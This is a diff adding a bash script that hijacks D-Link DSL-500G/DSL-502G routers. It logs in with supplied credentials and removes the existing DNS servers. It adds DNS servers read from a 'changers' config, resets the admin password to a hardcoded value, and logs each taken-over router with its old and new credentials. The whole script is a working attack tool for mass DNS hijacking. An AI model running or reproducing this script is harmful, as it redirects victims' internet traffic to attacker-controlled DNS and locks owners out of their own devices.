@@ -1,0 +1,38 @@
+#!/bin/bash
+
+# by bonny
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+dns1F1=`echo $DNS1 | cut -d '.' -f1`
+dns1F2=`echo $DNS1 | cut -d '.' -f2`
+dns1F3=`echo $DNS1 | cut -d '.' -f3`
+dns1F4=`echo $DNS1 | cut -d '.' -f4`
+dns2F1=`echo $DNS2 | cut -d '.' -f1`
+dns2F2=`echo $DNS2 | cut -d '.' -f2`
+dns2F3=`echo $DNS2 | cut -d '.' -f3`
+dns2F4=`echo $DNS2 | cut -d '.' -f4`
+
+for i in `${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/MainPage?id=24" | grep '/Action?id=58' | sed 's/^.*<a href="//' | sed 's/".*$//'`; do
+	if [ $i ]; then
+		${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}${i}" 1>/dev/null 2>/dev/null
+	fi
+done
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/Action?dns_status=1&id=57&dns_server_ip_1=${dns1F1}&dns_server_ip_2=${dns1F2}&dns_server_ip_3=${dns1F3}&dns_server_ip_4=${dns1F4}&cmdAdd=Add" 1>/dev/null 2>/dev/null
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/Action?dns_status=1&id=57&dns_server_ip_1=${dns2F1}&dns_server_ip_2=${dns2F2}&dns_server_ip_3=${dns2F3}&dns_server_ip_4=${dns2F4}&cmdAdd=Add" 1>/dev/null 2>/dev/null
+
+for s in `${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/MainPage?id=3" | grep '/Action?id=7' | sed 's/^.*<a href="//' | sed 's/".*$//'`; do
+	if [ ${s} ]; then
+		${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}${s}" 1>/dev/null 2>/dev/null
+	fi
+done
+${CURL} -u "${USERNAME}:${PASSWORD}" -d "user=${USERNAME}&ex_param1=${USERNAME}&id=3&old_pass=${PASSWORD}&new_pass1=${PASSWD}&new_pass2=${PASSWD}&cmdSubmit=Submit" "http://${HOSTNAME}/Action" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [D-LINK DSL-500G/DSL-502G]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [D-LINK DSL-500G/DSL-502G]" >> logs/modificados.log
